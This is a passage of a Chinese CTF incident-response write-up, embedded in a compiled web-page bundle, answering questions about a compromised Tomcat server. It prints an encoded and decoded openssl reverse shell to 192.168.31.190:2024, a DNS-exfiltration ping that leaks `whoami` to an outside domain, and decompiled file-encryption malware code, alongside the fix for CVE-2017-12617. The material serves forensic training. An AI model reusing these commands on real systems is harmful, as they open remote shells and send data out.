\u6570\u636e"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(74503).A+"",width:"2560",height:"1371"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c06\u653b\u51fb\u8005\u53d1\u9001\u7684\u8f7d\u8377\u4f9d\u6b21\u8fdb\u884c\u5904\u7406\uff0c\u5f97\u5230"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"/bin/bash -c ping -c 1 `whoami`.d5454c8975.ipv6.1433.eu.org.\n/bin/bash -c echo bWtmaWZvIC90bXAvcmV2c2hlbGw7IC9iaW4vYmFzaCAtaSA8IC90bXAvcmV2c2hlbGwgMj4mMSB8IG9wZW5zc2wgc19jbGllbnQgLXF1aWV0IC1jb25uZWN0IDE5Mi4xNjguMzEuMTkwOjIwMjQgLWtleWxvZ2ZpbGUga2V5LmxvZyA+IC90bXAvcmV2c2hlbGw7IHJtIC1mIC90bXAvcmV2c2hlbGw=|base64 -d|bash\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag",children:"flag{ping -c 1 `whoami`.d5454c8975.ipv6.1433.eu.org.}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"5",children:"5"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u8fd9\u4e2a webshell \u662f\u6839\u636e\u4ec0\u4e48\u8fdb\u884c\u56de\u663e\u7684\uff1f\uff08\u63d0\u4ea4 ip \u6216\u57df\u540d\uff09"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u6839\u636e\u5176\u6307\u4ee4"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"ping -c 1 `whoami`.d5454c8975.ipv6.1433.eu.org.\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u786e\u5b9a\u4e3a dns \u6570\u636e\u56de\u4f20\uff0c\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag",children:"flag{d5454c8975.ipv6.1433.eu.org.}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"6",children:"6"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:["\u9ed1\u5ba2\u7559\u4e0b\u540e\u95e8\u7684\u53cd\u8fde\u7684 IP \u548c PORT \u662f\u4ec0\u4e48\uff1f\uff08 ",(0,s.jsx)(n.code,{children:"flag{IP|PORT}"})," )"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u9996\u5148\uff0c\u6839\u636e\u653b\u51fb\u8005\u7684\u7b2c\u4e8c\u6761 webshell \u6d41\u91cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"/bin/bash -c echo bWtmaWZvIC90bXAvcmV2c2hlbGw7IC9iaW4vYmFzaCAtaSA8IC90bXAvcmV2c2hlbGwgMj4mMSB8IG9wZW5zc2wgc19jbGllbnQgLXF1aWV0IC1jb25uZWN0IDE5Mi4xNjguMzEuMTkwOjIwMjQgLWtleWxvZ2ZpbGUga2V5LmxvZyA+IC90bXAvcmV2c2hlbGw7IHJtIC1mIC90bXAvcmV2c2hlbGw=|base64 -d|bash\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5bf9\u5176\u8fdb\u884c\u89e3\u7801\uff0c\u5f97\u5230"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"mkfifo /tmp/revshell; /bin/bash -i </tmp/revshell 2>&1 | openssl s_client -quiet -connect 192.168.31.190:2024 -keylogfile key.log > /tmp/revshell; rm -f /tmp/revshell\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag",children:"flag{192.168.31.190|2024}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"7",children:"7"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u9ed1\u5ba2\u901a\u8fc7\u540e\u95e8\u53cd\u8fde\u6267\u884c\u7684\u7b2c\u4e00\u6761\u547d\u4ee4\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u7531\u4e8e\u653b\u51fb\u8005\u90e8\u7f72\u7684 webshell \u8f83\u96be\u8fdb\u884c\u4e8c\u6b21\u5229\u7528\uff0c\u6240\u4ee5\u76f4\u63a5\u4e0a\u4f20\u8681\u5251\u7684 webshell"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(36550).A+"",width:"2153",height:"1441"})}),"\n",(0,s.jsx)(n.p,{children:"\u6210\u529f\u8fde\u63a5"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(65441).A+"",width:"1542",height:"1040"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u9776\u673a\u4e0a\u627e\u5bfb ",(0,s.jsx)(n.code,{children:"openssl s_client"})," \u901a\u4fe1\u7684 key file"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'(remote) root@ip-10-0-10-1:/# find / -name "key.log"\n/opt/apache-tomcat-8.5.19/bin/key.log\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5c06\u6587\u4ef6\u83b7\u53d6\u5230\u672c\u5730\u4e4b\u540e\uff0c\u5bfc\u5165 wireshark"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(40778).A+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(n.p,{children:"\u6210\u529f\u89e3\u5bc6\u53cd\u8fde\u901a\u4fe1"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(52869).A+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(n.p,{children:"\u5e76\u5b9a\u4f4d\u5230\u653b\u51fb\u8005\u6267\u884c\u7684\u7b2c\u4e00\u6761\u6307\u4ee4"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(83308).A+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag",children:"flag{ls}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"8",children:"8"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:["\u8bf7\u4e0a\u673a\u6392\u67e5\u9ed1\u5ba2\u65b0\u589e\u7684\u540e\u95e8\u7a0b\u5e8f\u4f1a\u8fde\u63a5\u5230\u54ea\u53f0\u6076\u610f\u4e3b\u673a\uff1f\uff08\u63d0\u4ea4\u4e3b\u673a IP|port\uff09\u5982 (",(0,s.jsx)(n.code,{children:"flag{127.0.0.1|1234}"})," )"]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5728 ",(0,s.jsx)(n.code,{children:"/root"})," \u76ee\u5f55\u4e0b\u539f\u6709\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6 ",(0,s.jsx)(n.code,{children:"/root/update"})]}),"\n",(0,s.jsxs)(n.p,{children:["\u7ecf\u8fc7\u786e\u8ba4\uff0c\u76f8\u5173\u64cd\u4f5c\u4f4d\u4e8e ",(0,s.jsx)(n.code,{children:"/root/.bashrc"})," \u7684\u6700\u540e\u4e00\u884c"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"rm /root/flag.txt /root/update /root/lock  > /dev/null 2>&1\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u540c\u65f6\uff0c\u786e\u8ba4 ",(0,s.jsx)(n.code,{children:"/root/update"})," \u5728 ",(0,s.jsx)(n.code,{children:"/root/.data/update.bak"})," \u6709\u4e00\u4e2a\u5907\u4efd"]}),"\n",(0,s.jsx)(n.p,{children:"\u7531\u4e8e\u662f\u6a21\u62df\u73af\u5883\uff0c\u76f4\u63a5\u66b4\u529b\u4e00\u70b9"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"chmod +x /root/.data/update.bak\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c06\u5907\u4efd\u6587\u4ef6\u6dfb\u52a0\u53ef\u6267\u884c\u6743\u9650\u4e4b\u540e\uff0c\u76f4\u63a5\u8fd0\u884c\uff0c\u7136\u540e\u67e5\u770b\u7f51\u7edc\u8fde\u63a5\u4fe1\u606f"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"(remote) root@ip-10-0-10-1:/# netstat -anopt\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer\ntcp        0      0 0.0.0.0:222             0.0.0.0:*               LISTEN      501/sshd: /usr/sbin  off (0.00/0/0)\ntcp        0      0 10.0.10.1:54936         169.254.169.254:80      TIME_WAIT   -                    timewait (55.44/0/0)\ntcp        0      1 10.0.10.1:41482         10.10.13.37:4444        SYN_SENT    853/./update.bak     on (63.45/6/0)\ntcp        0      0 10.0.10.1:37528         52.82.213.39:443        ESTABLISHED 490/amazon-ssm-agen  keepalive (25.48/0/0)\ntcp        0      0 10.0.10.1:54926         169.254.169.254:80      TIME_WAIT   -                    timewait (55.42/0/0)\ntcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      498/java             off (0.00/0/0)\ntcp6       0      0 :::8009                 :::*                    LISTEN      498/java             off (0.00/0/0)\ntcp6       0      0 :::8081                 :::*                    LISTEN      498/java             off (0.00/0/0)\ntcp6       0      0 :::222                  :::*                    LISTEN      501/sshd: /usr/sbin  off (0.00/0/0)\ntcp6       0      0 10.0.10.1:48556         8.129.29.180:9998       ESTABLISHED 498/java             off (0.00/0/0)\ntcp6       0      0 10.0.10.1:8081          218.106.157.106:57240   TIME_WAIT   -                    timewait (50.46/0/0)\ntcp6       0    769 10.0.10.1:53242         8.129.29.180:9991       ESTABLISHED 498/java             on (0.18/0/0)\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag",children:"flag{10.10.13.37|4444}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"9",children:"9"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:["\u9ed1\u5ba2\u52a0\u5bc6\u4e86 ",(0,s.jsx)(n.code,{children:"/root"})," \u76ee\u5f55\u4e0b\u7684\u4e00\u4e2a\u91cd\u8981\u6587\u4ef6\uff0c\u8bf7\u4f60\u5c06\u89e3\u5bc6\u540e\u7684\u6587\u4ef6\u5185\u5bb9\u4f5c\u4e3a flag \u63d0\u4ea4"]}),"\n"]}),"\n",(0,s.jsxs)(n.admonition,{type:"warning",children:[(0,s.jsx)(n.p,{children:"\u622a\u6b62\u672c\u90e8\u5206\u5b8c\u6210\u4e4b\u65f6\uff0c\u9776\u673a\u5b58\u5728\u6709 bug"}),(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(59772).A+"",width:"1545",height:"1044"})}),(0,s.jsx)(n.p,{children:"\u539f\u59cb\u6587\u4ef6\u4e0e\u88ab\u52a0\u5bc6\u540e\u7684\u6587\u4ef6\u540c\u65f6\u5b58\u5728"})]}),"\n",(0,s.jsxs)(n.p,{children:["\u5728 ",(0,s.jsx)(n.code,{children:"/root"})," \u76ee\u5f55\u4e0b\u53d1\u73b0 Python Pyinstaller \u7684\u76ee\u5f55\u7279\u5f81"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(99175).A+"",width:"1545",height:"1044"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u5176\u4e2d\u53d1\u73b0\u4e86\u4e8c\u8fdb\u5236\u6587\u4ef6 ",(0,s.jsx)(n.code,{children:"init"}),"\uff0c\u7ecf\u8fc7\u68c0\u67e5\uff0c\u4e3a ",(0,s.jsx)(n.code,{children:"Python 3.9"})," \u7531 ",(0,s.jsx)(n.code,{children:"Pyinstaller"})," \u7f16\u8bd1\u5f97\u5230\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6"]}),"\n",(0,s.jsx)(n.p,{children:"\u5bf9\u5176\u8fdb\u884c\u53cd\u7f16\u8bd1\uff0c\u5f97\u5230"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"#!/usr/bin/env python\n# visit https://tool.lu/pyc/ for more information\n# Version: Python 3.9\n\nimport subprocess\nimport os\nimport asyncio\nlock_file = '/root/lock'\nupdate_file = '/root/update'\nflag_file = '/root/flag.txt'\nlock_backup = '/root/.data/lock.bak'\nupdate_backup = '/root/.data/update.bak'\nos.system(f'''cp {lock_backup} {lock_file}''')\nos.system(f'''cp {update_backup} {update_file}''')\nos.chmod(update_file, 511)\nos.chmod(lock_file, 511)\nupdate_process = subprocess.Popen([\n    '/bin/bash',\n    '-c',\n    update_file])\nlock_process = subprocess.Popen([\n    '/bin/bash',\n    '-c',\n    f'''{lock_file} /root/flag.txt /root/flagen.txt'''])\nupdate_process.wait()\nlock_process.wait()\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53d1\u73b0\u5176\u8c03\u7528\u4e86 ",(0,s.jsx)(n.code,{children:"/root/lock"})," \u6587\u4ef6\u5bf9 ",(0,s.jsx)(n.code,{children:"/root/flag.txt"})," \u6267\u884c\u4e86\u52a0\u5bc6\u884c\u4e3a\uff0c\u5bf9 ",(0,s.jsx)(n.code,{children:"/root/lock"})," \u6587\u4ef6\u8fdb\u884c\u5206\u6790"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(12928).A+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'__int64 __fastcall main(int a1, char **a2, char **a3)\n{\n    FILE *v4; // r12\n    FILE *v5; // r13\n    char *v6; // rax\n    char v7; // dl\n    char *v8; // rax\n    char v9; // dl\n    size_t v10; // rax\n    __int64 v11; // rdx\n    char *v12; // rax\n    __int64 v13; // rcx\n    unsigned __int64 v14; // rsi\n    unsigned int v15; // eax\n    unsigned int v16; // eax\n    unsigned int v17; // edx\n    __int64 v18; // rdi\n    _BYTE v19[16]; // [rsp+0h] [rbp-178h] BYREF\n    char ptr[16]; // [rsp+10h] [rbp-168h] BYREF\n    char v21[16]; // [rsp+20h] [rbp-158h] BYREF\n    char v22[16]; // [rsp+30h] [rbp-148h] BYREF\n    char v23[312]; // [rsp+40h] [rbp-138h] BYREF\n\n    if (a1 == 3)\n    {\n        v4 = fopen(a2[1], "rb");\n        if (v4)\n        {\n            v5 = fopen(a2[2], "wb");\n            if (v5)\n            {\n                v6 = v19;\n                do\n                {\n                    v7 = 65 - (unsigned __int8)v19 + (_BYTE)v6++;\n                    *(v6 - 1) = v7;\n                }\n                while (v6 != ptr);\n                v8 = ptr;\n                do\n                {\n                    v9 = 97 - (unsigned __int8)ptr + (_BYTE)v8++;\n                    *(v8 - 1) = v9;\n                }\n                while (v8 != v21);\n                    AES_set_encrypt_key(v19, 128LL, v23);\n                    fwrite(ptr, 1uLL, 0x10uLL, v5);\n                while (1)\n                {\n                    v10 = fread(v21, 1uLL, 0x10uLL, v4);\n                    if (!v10)\n                        break;\n                    if (v10 <= 0xF)\n                    {\n                        v11 = (unsigned int)(16 - v10);\n                        v12 = &v21[v10];\n                        v13 = 0x101010101010101LL * (unsigned __int8)v11;\n                        if ((unsigned int)v11 >= 8 )\n                        {\n                            *(_QWORD *)v12 = v13;\n                            *(_QWORD *)&v12[(unsigned int)v11 - 8] = v13;\n                            v14 = (unsigned __int64)(v12 + 8) & 0xFFFFFFFFFFFFFFF8LL;\n                            v15 = (v11 + (_DWORD)v12 - v14) & 0xFFFFFFF8;\n                            if (v15>= 8 )\n                            {\n                                v16 = v15 & 0xFFFFFFF8;\n                                v17 = 0;\n                                do\n                                {\n                                    v18 = v17;\n                                    v17 += 8;\n                                    *(_QWORD *)(v14 + v18) = v13;\n                                }\n                                while (v17 < v16);\n                            }\n                        }\n                        else if ((v11 & 4) != 0 )\n                        {\n                            *(_DWORD *)v12 = v13;\n                            *(_DWORD *)&v12[v11 - 4] = v13;\n                        }\n                        else if ((_DWORD)v11 )\n                        {\n                        *v12 = v11;\n                        if ((v11 & 2) != 0 )\n                            *(_WORD *)&v12[v11 - 2] = v13;\n                        }\n                    }\n                    AES_cbc_encrypt(v21, v22, 16LL, v23, ptr, 1LL);\n                    fwrite(v22, 1uLL, 0x10uLL, v5);\n                }\n                fclose(v4);\n                fclose(v5);\n                puts(&s);\n                while (1)\n                ;\n            }\n        perror(&byte_2051);\n        fclose(v4);\n        }\n        else\n        {\n            perror(&byte_2035);\n        }\n    }\n    else\n    {\n        fprintf(stderr, &format, *a2);\n    }\n    return 1LL;\n}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u6574\u4f53\u903b\u8f91\u5e76\u4e0d\u590d\u6742\uff0c\u5176\u4e2d\u51fd\u6570 ",(0,s.jsx)(n.code,{children:"AES_cbc_encrypt"})," \u5c24\u4e3a\u7a81\u51fa"]}),"\n",(0,s.jsx)(n.p,{children:"\u76f4\u63a5\u52a8\u8c03\u770b\u4e00\u4e0b\u6548\u679c"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(79541).A+"",width:"2560",height:"1540"})}),"\n",(0,s.jsxs)(n.p,{children:["\u8ddf\u8fdb\u5230 ",(0,s.jsx)(n.code,{children:"AES_set_encrypt_key"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(65562).A+"",width:"1783",height:"957"})}),"\n",(0,s.jsx)(n.p,{children:"\u6839\u636e\u6240\u5f97\u5230\u7684\u53c2\u6570\uff0c\u76f4\u63a5\u6267\u884c AES CBC \u89e3\u5bc6\u5373\u53ef"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag",children:"flag{0ba9af0100c01e88a3a1280ec5b39715}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"10",children:"10"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:["\u8bf7\u4f60\u627e\u5230\u5e76\u4fee\u590d\u5165\u53e3\u6f0f\u6d1e\u540e\u8fd0\u884c ",(0,s.jsx)(n.code,{children:"/root"})," \u4e0b\u7684 ",(0,s.jsx)(n.code,{children:"check_tomcat"})," \u6587\u4ef6\uff0c\u5c06\u5f97\u5230\u7684 flag \u63d0\u4ea4"]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u91cc\u91c7\u7528\u66b4\u529b\u4e00\u70b9\u7684\u65b9\u6848\uff0c\u76f4\u63a5\u5bf9 ",(0,s.jsx)(n.code,{children:"check_tomcat"})," \u7a0b\u5e8f\u8fdb\u884c\u5206\u6790"]}),"\n",(0,s.jsxs)(n.p,{children:["\u540c\u6837\u7684\u8fd8\u662f ",(0,s.jsx)(n.code,{children:"Python 3.9 Pyinstaller"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"#!/usr/bin/env python\n# visit https://tool.lu/pyc/ for more information\n# Version: Python 3.9\n\nimport requests\nimport random\nburp0_url = 'http://127.0.0.1:8081/check.jsp/'\nburp0_headers = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',\n    'Accept-Encoding': 'gzip, deflate, br',\n    'Connection': 'keep-alive',\n    'Upgrade-Insecure-Requests': '1',\n    'Priority': 'u=0, i',\n    'Content-Type': 'application/x-www-form-urlencoded' }\nburp0_data = '<%@ page contentType=\"text/html;charset=UTF-8\"language=\"java\"%>\\r\\n<html>\\r\\n<head>\\r\\n    <title>Hello World JSP</title>\\r\\n</head>\\r\\n<body>\\r\\n    <h1>Hello, World!</h1>\\r\\n</body>\\r\\n</html>'\n# WARNING: Decompyle incomplete\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u90a3\u5c31\u5f88\u660e\u663e\u4e86\uff0c\u9700\u8981\u5bf9 ",(0,s.jsx)(n.code,{children:"Tomcat CVE-2017\u201312617"})," \u6f0f\u6d1e\u8fdb\u884c\u4fee\u8865"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5b9a\u4f4d\u5230 Tomcat \u7684\u914d\u7f6e\u6587\u4ef6 ",(0,s.jsx)(n.code,{children:"/opt/apache-tomcat-8.5.19/conf/web.xml"})," \u8fdb\u884c\u4fee\u6539\uff0c\u5728 ",(0,s.jsx)(n.code,{children:"web-app"})," \u8282\u70b9\u4e0b\u52a0\u5165\u4ee5\u4e0b\u914d\u7f6e"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-xml",children:"<security-constraint>\n    <web-resource-collection>\n        <url-pattern>/*</url-pattern>\n        <http-method>PUT</http-method>\n        <http-method>DELETE</http-method>\n        <http-method>HEAD</http-method>\n        <http-method>OPTIONS</http-method>\n        <http-method>TRACE</http-method>\n    </web-resource-collection>\n    <auth-constraint></auth-constraint>\n</security-constraint>\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4fee\u6539\u5b8c\u4e4b\u540e\uff0c\u5373\u53ef\u8fdb\u884c check"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(70078).A+"",width:"1545",height:"1184"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag",children:"flag{ba5579c780bf4a799e03a60c6be383e9}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(o,{...e})}):o(e)}},61993:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250104-120450-d2b5cc44828614318a1e83947f136559.png"},74503:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250105-120521-75713864cc1980a130fcd359c55cdf65.png"},70078:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250105-220514-073979ee703a50582049249671d78464.png"},36550:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250120-212037-29bb20d18c37258ad8590a5dae668fcd.png"},65441:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250120-212052-36809d3fdd15c0be1fe5a443a23654be.png"},40778:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250123-122320-05235b38c1b0b0bbba27a4f9a57c190a.png"},52869:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250124-122458-1f1eec9856288e4f85f3e2657be8fc29.png"},83308:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250125-122540-2cc6032aeb45ae5e5e2114f32ef8a715.png"},91407:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250139-203959-5c34b687aeecfd8e72a777ecee78542f.png"},16615:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250144-204402-8eacae9906038f48abc5769553b0a7f0.png"},567:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250145-204539-3a43658fcd93012b04dd33ab0ecc5078.png"},59772:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250145-214528-5be33a0aed1de071d7595b52adc5a394.png"},99175:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250146-214618-ce6b04a06bed30444aef4a937672f580.png"},20650:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250147-204738-ac2efa42cc88e8d8371d4aa63f6fc7ce.png"},12928:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250148-214848-7506bfe641131d760070c3a578ae590b.png"},93739:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250151-205111-fddbbf798a159074ec7af575c505cfa6.png"},99053:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250152-205215-d751ebd6f1ad8ab9b2566ef81e616302.png"},79541:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250156-105647-935589b1b1925bce7ff5e3e5f5b4dfd4.png"},65562:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20250159-105919-fb6d316ced6053857f7b352acb25f033.png"},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>c});var a=t(96540);const s={},r=a.createContext(s);function i(e){const n=a.useContext(r);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),a.createElement(r.Provider,{value:n},e.children)}}}]);